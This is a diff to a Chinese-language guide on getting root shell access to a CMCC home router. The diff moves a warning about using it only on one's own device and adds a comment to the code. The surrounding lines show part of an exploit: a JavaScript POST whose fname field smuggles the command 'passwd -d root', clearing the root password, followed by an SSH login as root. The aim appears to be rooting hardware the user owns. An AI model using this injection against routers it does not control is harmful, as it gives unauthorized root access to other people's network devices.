@@ -74,6 +74,8 @@
 
 #### 同型号提示“无效地址”的处理方法
 
+- ⚠️ 该脚本属于利用漏洞的临时提权手段，请仅在自有设备上使用，勿用于共享或公共网络设备，并确认执行后会清空 root 密码；连接成功后建议立即执行 `passwd root` 设置新密码。
+
 - 打开 Chrome 调试窗口，切换到「网络（Network）」
 - 刷新页面后，找到 `items` 相关的 POST 请求
 - 在「负载（Payload）」中找到 `sessionId` 并记录
@@ -85,7 +87,7 @@
     cmd: 22,
     fname: "websys.log|passwd -d root",
     method: "get",
-    sessionId: "YOUR_SESSION_ID_HERE"
+    sessionId: "YOUR_SESSION_ID_HERE" // 替换为步骤 3 记录的 sessionId
   };
   var xhr = new XMLHttpRequest();
   xhr.open("POST", url, true);
@@ -108,8 +110,6 @@
   ```bash
   ssh -oHostKeyAlgorithms=+ssh-rsa root@cmcc.wifi
   ```
-
-- ⚠️ 该脚本属于利用漏洞的临时提权手段，请仅在自有设备上使用，勿用于共享或公共网络设备，并确认执行后会清空 root 密码；连接成功后建议立即执行 `passwd root` 设置新密码。
 
 ### 2. 取得 Telnet（二选一）
 
